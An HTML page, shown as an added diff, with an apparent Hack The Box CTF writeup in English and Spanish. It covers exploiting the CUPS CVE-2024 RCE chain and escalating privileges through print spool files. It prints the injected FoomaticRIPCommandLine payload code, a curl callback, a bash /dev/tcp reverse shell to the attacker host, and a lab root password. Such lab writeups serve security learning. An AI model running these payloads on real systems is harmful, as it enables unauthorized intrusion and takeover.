@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>evilcups | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">evilcups</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running an OpenPrinting CUPS service vulnerable to a chain of four CVEs (CVE-2024-47176, CVE-2024-47076, CVE-2024-47175, and CVE-2024-47177) that, when exploited together, allow for remote code execution. The attack begins by forcing the CUPS server to connect to a malicious IPP server under attacker control through an unauthenticated UDP packet.</p>
+
+                    <p>Once the connection is established, malicious PPD (PostScript Printer Description) attributes are injected, exploiting improper validation in libcupsfilters and libppd. When a print job is triggered, the <code>foomatic-rip</code> filter processes the malicious PPD file, leading to command injection and execution of an arbitrary reverse shell payload. Initial access was obtained as the <code>lp</code> user.</p>
+
+                    <p>Privilege escalation was achieved through enumeration of the CUPS spool directory at <code>/var/spool/cups</code>, where print job data files are stored. By reading job data files following CUPS naming conventions, root credentials were discovered in plaintext within a previous print job, allowing direct escalation to root access via <code>su</code>.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> OpenPrinting CUPS vulnerability chain (CVE-2024-47176, CVE-2024-47076, CVE-2024-47175, CVE-2024-47177), IPP protocol exploitation, PPD file injection, foomatic-rip command injection, CUPS spool directory information disclosure.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I start with an nmap scan to identify open ports and services running on the target machine:</p>
+                <p><img src="./media/image1.png"
+                        alt="Nmap scan results showing open ports including SSH on port 22 and IPP on port 631" />
+                </p>
+
+                <p>The scan reveals port 631 is open, which is the standard port for the Internet Printing Protocol (IPP). Accessing the web interface on this port reveals information about the CUPS service:</p>
+                <p><img src="./media/image2.png"
+                        alt="CUPS web interface showing the service version and printer administration panel" />
+                </p>
+
+                <p>The web interface displays the exact version of the CUPS service. This is valuable information as it allows me to search for version-specific vulnerabilities.</p>
+
+                <h2>Vulnerability Research - CUPS Exploit Chain</h2>
+                <p>After identifying the CUPS version, I search for known vulnerabilities affecting this version. I discover a critical security advisory in the official OpenPrinting repository: <a
+                        href="https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8">https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8</a>
+                </p>
+
+                <p>The advisory includes a Python proof-of-concept, but after testing it without success, I find an alternative exploit on GitHub: <a
+                        href="https://github.com/0xCZR1/PoC-Cups-RCE-CVE-exploit-chain">https://github.com/0xCZR1/PoC-Cups-RCE-CVE-exploit-chain</a>
+                </p>
+
+                <h3>Understanding the Vulnerability Chain</h3>
+                <p>This exploit leverages a chain of four CVEs that, when combined, allow for remote code execution on vulnerable CUPS installations:</p>
+
+                <ul>
+                    <li><strong>CVE-2024-47176:</strong> Unrestricted packet processing on UDP port 631, allowing unauthenticated remote attackers to force CUPS to contact an attacker's IPP server.</li>
+                    <li><strong>CVE-2024-47076:</strong> Improper validation of IPP attributes in <code>libcupsfilters</code>, which allows attacker-controlled data to be processed as valid.</li>
+                    <li><strong>CVE-2024-47175:</strong> Injection of malicious data into PPD files via <code>libppd</code>, allowing for command execution during print jobs.</li>
+                    <li><strong>CVE-2024-47177:</strong> Command injection via <code>foomatic-rip</code>, allowing attackers to execute arbitrary commands on the system.</li>
+                </ul>
+
+                <h3>Attack Flow</h3>
+                <p>The exploitation process works as follows:</p>
+                <ol>
+                    <li>The PoC script sets up a Python-based IPP server that simulates a printer using <a
+                            href="https://github.com/h2g2bob/ipp-server">ipp-server</a> on the attacker's machine</li>
+                    <li>Using CVE-2024-47176, a UDP packet is sent to the victim's CUPS server on port 631, forcing it to connect to the attacker's fake printer server</li>
+                    <li>When the victim machine connects to request printer attributes, the malicious payload is delivered through IPP attributes</li>
+                    <li>The payload exploits CVE-2024-47076 (improper validation), CVE-2024-47175 (PPD injection), and CVE-2024-47177 (foomatic-rip command injection) to achieve code execution</li>
+                    <li>A print job request is sent to trigger the malicious PPD file processing and execute the injected command</li>
+                </ol>
+
+                <p>The malicious attributes in the exploit look like this:</p>
+                <pre><code class="language-python">attributes = super().printer_list_attributes()
+attributes.update({
+    (SectionEnum.printer, b'printer-more-info', TagEnum.uri): [
+        f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()
+    ]
+})</code></pre>
+
+                <p>This code injects the command into the <code>FoomaticRIPCommandLine</code> directive, which will be executed when <code>foomatic-rip</code> processes the print job.</p>
+
+                <h2>Initial Access - Exploiting the CUPS Vulnerability Chain</h2>
+                <p>I prepare the exploit by specifying my attacking IP, the target IP, and the command I want to execute (a curl request to test connectivity):</p>
+                <pre><code class="language-bash">python3 cups-rce.py 10.10.16.6 10.10.11.40 "curl 10.10.16.6:8000"</code></pre>
+
+                <p>The script starts the IPP server and sends the initial UDP packet:</p>
+                <pre><code class="language-plaintext">Starting IPP server at ('10.10.16.6', 12349)
+Sending UDP packet to 10.10.11.40:631...
+Packet content:
+2 3 http://10.10.16.6:12349/printers/EVILCUPS "Pwned Location" "Pwned Printer" "HP LaserJet 1020"</code></pre>
+
+                <p>This UDP packet exploits CVE-2024-47176 to force the victim's CUPS service to connect to my malicious IPP server. When the victim connects to retrieve printer attributes, the payload containing the injected command is delivered.</p>
+
+                <h3>Triggering Code Execution</h3>
+                <p>After the victim server connects to my fake printer, I need to trigger a print job to execute the injected command. I use a separate script to send a print job request. This causes the CUPS service to process the malicious PPD file through <code>foomatic-rip</code>, triggering the command injection.</p>
+
+                <p>For a proper reverse shell, I modify the command to:</p>
+                <pre><code class="language-bash">nohup bash -c "bash -i >&amp; /dev/tcp/10.10.16.6/443 0>&amp;1"</code></pre>
+
+                <p>The <code>nohup</code> command is crucial here because the printer created by the exploit is automatically deleted after a short time, which would normally kill the shell. By using <code>nohup</code>, the reverse shell is started as a background process that persists even after the printer is removed. More information about <code>nohup</code> can be found at <a
+                        href="https://www.digitalocean.com/community/tutorials/nohup-command-in-linux">https://www.digitalocean.com/community/tutorials/nohup-command-in-linux</a>
+                </p>
+
+                <p>I set up a netcat listener to catch the reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Once the print job is triggered, I receive a reverse shell connection as the <code>lp</code> user (the CUPS service user). While enumerating the <code>/home</code> directory, I notice there's another user named <code>htb</code>, and I can access their home directory where I retrieve the user flag.</p>
+
+                <h2>Privilege Escalation - CUPS Spool Directory Enumeration</h2>
+                <p>After gaining initial access as the <code>lp</code> user, I search for typical privilege escalation vectors but find nothing immediately useful. I decide to investigate the CUPS service itself and where it might store sensitive information.</p>
+
+                <h3>Understanding CUPS Job Storage</h3>
+                <p>Through research on the CUPS architecture, I discover that CUPS stores print job files in a spool directory, typically located at <code>/var/spool/cups</code>. According to the official CUPS documentation at <a
+                        href="https://www.cups.org/doc/spec-design.html">https://www.cups.org/doc/spec-design.html</a>:</p>
+
+                <blockquote>
+                    <p>"The scheduler stores job files in a spool directory, typically /var/spool/cups. Two types of files will be found in the spool directory: control files starting with the letter 'c' ('c00001', 'c99999', 'c100000', etc.) and data files starting with the letter 'd' ('d00001-001', 'd99999-001', 'd100000-001', etc.) Control files are IPP messages based on the original IPP Print-Job or Create-Job messages, while data files are the original print files that were submitted for printing."</p>
+                </blockquote>
+
+                <p>I navigate to <code>/var/spool/cups</code>, but attempting to list files returns a permission denied error. However, knowing the naming convention for these files from the documentation, I can still try to read specific files directly.</p>
+
+                <h3>Discovering Root Credentials</h3>
+                <p>Following the documented naming pattern, I attempt to read the first data file:</p>
+                <pre><code class="language-bash">cat d00001-001</code></pre>
+
+                <p>This successfully displays the contents of a previous print job, and within this data file, I discover plaintext root credentials: <code>Br3@k-G!@ss-r00t-evilcups</code></p>
+
+                <p>It appears that someone printed a document containing the root password, and since CUPS stores all print job data in the spool directory, this sensitive information is now accessible to anyone who can read these files.</p>
+
+                <h3>Escalating to Root</h3>
+                <p>With the root credentials in hand, I use the <code>su</code> command to switch to the root user:</p>
+                <pre><code class="language-bash">su root</code></pre>
+
+                <p>After entering the discovered password, I successfully gain root access:</p>
+                <pre><code class="language-bash">root@evilcups:/var/spool/cups# whoami
+root</code></pre>
+
+                <p>I can now retrieve the root flag and complete the machine:</p>
+                <pre><code class="language-bash">cat /root/root.txt</code></pre>
+
+                <p>This privilege escalation highlights an important security consideration: print job data can contain sensitive information, and improper access controls on the CUPS spool directory can lead to information disclosure and privilege escalation.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba un servicio OpenPrinting CUPS vulnerable a una cadena de cuatro CVEs (CVE-2024-47176, CVE-2024-47076, CVE-2024-47175 y CVE-2024-47177) que, al explotarse juntos, permiten la ejecución remota de código. El ataque comienza forzando al servidor CUPS a conectarse a un servidor IPP malicioso bajo control del atacante mediante un paquete UDP no autenticado.</p>
+
+                    <p>Una vez establecida la conexión, se inyectan atributos PPD (PostScript Printer Description) maliciosos, explotando la validación inadecuada en libcupsfilters y libppd. Cuando se dispara un trabajo de impresión, el filtro <code>foomatic-rip</code> procesa el archivo PPD malicioso, llevando a una inyección de comandos y ejecución de un payload de reverse shell arbitrario. El acceso inicial se obtuvo como usuario <code>lp</code>.</p>
+
+                    <p>La escalada de privilegios se logró mediante enumeración del directorio spool de CUPS en <code>/var/spool/cups</code>, donde se almacenan archivos de datos de trabajos de impresión. Leyendo archivos de datos de trabajos siguiendo las convenciones de nomenclatura de CUPS, se descubrieron credenciales de root en texto plano dentro de un trabajo de impresión anterior, permitiendo escalada directa a acceso root mediante <code>su</code>.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> Cadena de vulnerabilidades de OpenPrinting CUPS (CVE-2024-47176, CVE-2024-47076, CVE-2024-47175, CVE-2024-47177), explotación del protocolo IPP, inyección de archivos PPD, inyección de comandos en foomatic-rip, divulgación de información en directorio spool de CUPS.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image1.png"
+                        alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 e IPP en el puerto 631" />
+                </p>
+
+                <p>El escaneo revela que el puerto 631 está abierto, que es el puerto estándar para el Protocolo de Impresión por Internet (IPP). Accediendo a la interfaz web en este puerto se revela información sobre el servicio CUPS:</p>
+                <p><img src="./media/image2.png"
+                        alt="Interfaz web de CUPS mostrando la versión del servicio y el panel de administración de impresoras" />
+                </p>
+
+                <p>La interfaz web muestra la versión exacta del servicio CUPS. Esta es información valiosa ya que me permite buscar vulnerabilidades específicas de la versión.</p>
+
+                <h2>Investigación de Vulnerabilidades - Cadena de Exploits de CUPS</h2>
+                <p>Tras identificar la versión de CUPS, busco vulnerabilidades conocidas que afecten a esta versión. Descubro un advisory crítico de seguridad en el repositorio oficial de OpenPrinting: <a
+                        href="https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8">https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8</a>
+                </p>
+
+                <p>El advisory incluye una prueba de concepto en Python, pero tras probarla sin éxito, encuentro un exploit alternativo en GitHub: <a
+                        href="https://github.com/0xCZR1/PoC-Cups-RCE-CVE-exploit-chain">https://github.com/0xCZR1/PoC-Cups-RCE-CVE-exploit-chain</a>
+                </p>
+
+                <h3>Entendiendo la Cadena de Vulnerabilidades</h3>
+                <p>Este exploit aprovecha una cadena de cuatro CVEs que, cuando se combinan, permiten la ejecución remota de código en instalaciones de CUPS vulnerables:</p>
+
+                <ul>
+                    <li><strong>CVE-2024-47176:</strong> Procesamiento de paquetes sin restricciones en el puerto UDP 631, permitiendo a atacantes remotos no autenticados forzar a CUPS a contactar con el servidor IPP del atacante.</li>
+                    <li><strong>CVE-2024-47076:</strong> Validación inadecuada de atributos IPP en <code>libcupsfilters</code>, que permite que datos controlados por el atacante sean procesados como válidos.</li>
+                    <li><strong>CVE-2024-47175:</strong> Inyección de datos maliciosos en archivos PPD mediante <code>libppd</code>, permitiendo la ejecución de comandos durante trabajos de impresión.</li>
+                    <li><strong>CVE-2024-47177:</strong> Inyección de comandos mediante <code>foomatic-rip</code>, permitiendo a atacantes ejecutar comandos arbitrarios en el sistema.</li>
+                </ul>
+
+                <h3>Flujo del Ataque</h3>
+                <p>El proceso de explotación funciona de la siguiente manera:</p>
+                <ol>
+                    <li>El script PoC configura un servidor IPP basado en Python que simula una impresora usando <a
+                            href="https://github.com/h2g2bob/ipp-server">ipp-server</a> en la máquina del atacante</li>
+                    <li>Usando CVE-2024-47176, se envía un paquete UDP al servidor CUPS de la víctima en el puerto 631, forzándolo a conectarse al servidor de impresora falso del atacante</li>
+                    <li>Cuando la máquina víctima se conecta para solicitar atributos de la impresora, el payload malicioso se entrega mediante atributos IPP</li>
+                    <li>El payload explota CVE-2024-47076 (validación inadecuada), CVE-2024-47175 (inyección PPD) y CVE-2024-47177 (inyección de comandos en foomatic-rip) para lograr ejecución de código</li>
+                    <li>Se envía una solicitud de trabajo de impresión para disparar el procesamiento del archivo PPD malicioso y ejecutar el comando inyectado</li>
+                </ol>
+
+                <p>Los atributos maliciosos en el exploit se ven así:</p>
+                <pre><code class="language-python">attributes = super().printer_list_attributes()
+attributes.update({
+    (SectionEnum.printer, b'printer-more-info', TagEnum.uri): [
+        f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()
+    ]
+})</code></pre>
+
+                <p>Este código inyecta el comando en la directiva <code>FoomaticRIPCommandLine</code>, que será ejecutada cuando <code>foomatic-rip</code> procese el trabajo de impresión.</p>
+
+                <h2>Acceso Inicial - Explotando la Cadena de Vulnerabilidades de CUPS</h2>
+                <p>Preparo el exploit especificando mi IP de ataque, la IP objetivo y el comando que quiero ejecutar (una petición curl para probar conectividad):</p>
+                <pre><code class="language-bash">python3 cups-rce.py 10.10.16.6 10.10.11.40 "curl 10.10.16.6:8000"</code></pre>
+
+                <p>El script arranca el servidor IPP y envía el paquete UDP inicial:</p>
+                <pre><code class="language-plaintext">Starting IPP server at ('10.10.16.6', 12349)
+Sending UDP packet to 10.10.11.40:631...
+Packet content:
+2 3 http://10.10.16.6:12349/printers/EVILCUPS "Pwned Location" "Pwned Printer" "HP LaserJet 1020"</code></pre>
+
+                <p>Este paquete UDP explota CVE-2024-47176 para forzar al servicio CUPS de la víctima a conectarse a mi servidor IPP malicioso. Cuando la víctima se conecta para recuperar atributos de la impresora, se entrega el payload que contiene el comando inyectado.</p>
+
+                <h3>Disparando la Ejecución de Código</h3>
+                <p>Después de que el servidor víctima se conecta a mi impresora falsa, necesito disparar un trabajo de impresión para ejecutar el comando inyectado. Uso un script separado para enviar una solicitud de trabajo de impresión. Esto hace que el servicio CUPS procese el archivo PPD malicioso mediante <code>foomatic-rip</code>, disparando la inyección de comandos.</p>
+
+                <p>Para una reverse shell apropiada, modifico el comando a:</p>
+                <pre><code class="language-bash">nohup bash -c "bash -i >&amp; /dev/tcp/10.10.16.6/443 0>&amp;1"</code></pre>
+
+                <p>El comando <code>nohup</code> es crucial aquí porque la impresora creada por el exploit se elimina automáticamente después de poco tiempo, lo que normalmente mataría la shell. Al usar <code>nohup</code>, la reverse shell se inicia como un proceso en background que persiste incluso después de que la impresora se elimine. Más información sobre <code>nohup</code> se puede encontrar en <a
+                        href="https://www.digitalocean.com/community/tutorials/nohup-command-in-linux">https://www.digitalocean.com/community/tutorials/nohup-command-in-linux</a>
+                </p>
+
+                <p>Configuro un listener de netcat para capturar la reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Una vez disparado el trabajo de impresión, recibo una conexión de reverse shell como usuario <code>lp</code> (el usuario del servicio CUPS). Al enumerar el directorio <code>/home</code>, noto que hay otro usuario llamado <code>htb</code>, y puedo acceder a su directorio home donde recupero la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios - Enumeración del Directorio Spool de CUPS</h2>
+                <p>Tras ganar acceso inicial como usuario <code>lp</code>, busco vectores típicos de escalada de privilegios pero no encuentro nada inmediatamente útil. Decido investigar el propio servicio CUPS y dónde podría almacenar información sensible.</p>
+
+                <h3>Entendiendo el Almacenamiento de Trabajos de CUPS</h3>
+                <p>Mediante investigación sobre la arquitectura de CUPS, descubro que CUPS almacena archivos de trabajos de impresión en un directorio spool, típicamente localizado en <code>/var/spool/cups</code>. Según la documentación oficial de CUPS en <a
+                        href="https://www.cups.org/doc/spec-design.html">https://www.cups.org/doc/spec-design.html</a>:</p>
+
+                <blockquote>
+                    <p>"El planificador almacena archivos de trabajos en un directorio spool, típicamente /var/spool/cups. Se encontrarán dos tipos de archivos en el directorio spool: archivos de control que comienzan con la letra 'c' ('c00001', 'c99999', 'c100000', etc.) y archivos de datos que comienzan con la letra 'd' ('d00001-001', 'd99999-001', 'd100000-001', etc.) Los archivos de control son mensajes IPP basados en los mensajes originales IPP Print-Job o Create-Job, mientras que los archivos de datos son los archivos de impresión originales que fueron enviados para imprimir."</p>
+                </blockquote>
+
+                <p>Navego a <code>/var/spool/cups</code>, pero intentar listar archivos devuelve un error de permiso denegado. Sin embargo, conociendo la convención de nomenclatura para estos archivos de la documentación, aún puedo intentar leer archivos específicos directamente.</p>
+
+                <h3>Descubriendo las Credenciales de Root</h3>
+                <p>Siguiendo el patrón de nomenclatura documentado, intento leer el primer archivo de datos:</p>
+                <pre><code class="language-bash">cat d00001-001</code></pre>
+
+                <p>Esto muestra exitosamente el contenido de un trabajo de impresión anterior, y dentro de este archivo de datos, descubro credenciales de root en texto plano: <code>Br3@k-G!@ss-r00t-evilcups</code></p>
+
+                <p>Parece que alguien imprimió un documento conteniendo la contraseña de root, y dado que CUPS almacena todos los datos de trabajos de impresión en el directorio spool, esta información sensible ahora es accesible para cualquiera que pueda leer estos archivos.</p>
+
+                <h3>Escalando a Root</h3>
+                <p>Con las credenciales de root en mano, uso el comando <code>su</code> para cambiar al usuario root:</p>
+                <pre><code class="language-bash">su root</code></pre>
+
+                <p>Tras introducir la contraseña descubierta, obtengo exitosamente acceso root:</p>
+                <pre><code class="language-bash">root@evilcups:/var/spool/cups# whoami
+root</code></pre>
+
+                <p>Ahora puedo recuperar la flag de root y completar la máquina:</p>
+                <pre><code class="language-bash">cat /root/root.txt</code></pre>
+
+                <p>Esta escalada de privilegios resalta una consideración de seguridad importante: los datos de trabajos de impresión pueden contener información sensible, y controles de acceso inadecuados en el directorio spool de CUPS pueden llevar a divulgación de información y escalada de privilegios.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
